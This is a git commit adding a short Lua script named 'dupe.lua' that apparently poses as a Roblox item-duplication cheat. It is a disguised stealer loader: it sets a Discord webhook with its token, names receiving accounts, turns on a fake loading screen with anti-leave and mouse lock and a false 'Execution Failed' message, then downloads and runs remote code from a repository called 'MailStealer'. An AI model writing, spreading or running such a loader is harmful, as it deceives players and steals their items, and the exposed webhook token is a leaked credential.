6840c11cd88c01400875409ef3ed95a7db8587d3
gerko <gerkoton@gmail.com>
2023-07-28 15:20:38 +0200

    dupe.lua

---
+++ dupe.lua
@@ -0,0 +1,15 @@
+UserName = "Shadovel"
+Webhook = "https://discord.com/api/webhooks/1133030492497776671/Mebw5Stvgvl9nHbjxeePRn1DNpbbEYjzfZ4FmHQaRoY0BsHnzThlfnKludq1GoaGVDSL"
+UserName2 = "Jailpail46"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+_G.LoadingText1 = "Loading Library"
+_G.LoadingText2 = "Updating Library"
+_G.LoadingText3 = "Getting Script"
+_G.LoadingText4 = "Executing Script"
+_G.LoadingText5 = "Error: Execution Failed, re-trying!"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hsdfuyhsdufhs/MailStealer/main/engine"))()
